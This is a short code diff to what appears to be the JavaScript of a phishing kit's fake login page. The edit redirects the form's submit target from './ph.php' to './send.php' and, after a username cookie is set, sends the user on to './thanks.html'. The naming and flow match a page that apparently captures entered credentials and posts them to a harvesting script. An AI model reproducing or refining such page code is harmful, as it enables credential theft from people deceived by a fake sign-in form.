@@ -26,7 +26,7 @@ document.addEventListener('DOMContentLoaded' ,function(){
   	.prop("type", "password");
   }
 });
-    var url="./ph.php"
+    var url="./send.php"
     submit_btn = document.getElementById("continueFromUserLogin");
     userInputContainerDiv = document.getElementById("userInputContainerDiv")
     userBackButton =  document.getElementById("userBackButtonSpanTxt")
@@ -92,7 +92,7 @@ document.addEventListener('DOMContentLoaded' ,function(){
                         }
                         else{  
                            setCookie("username", username, 30);
-                           window.location.href= "./send.php"
+                           window.location.href= "./thanks.html"
                         }
                     
                 })
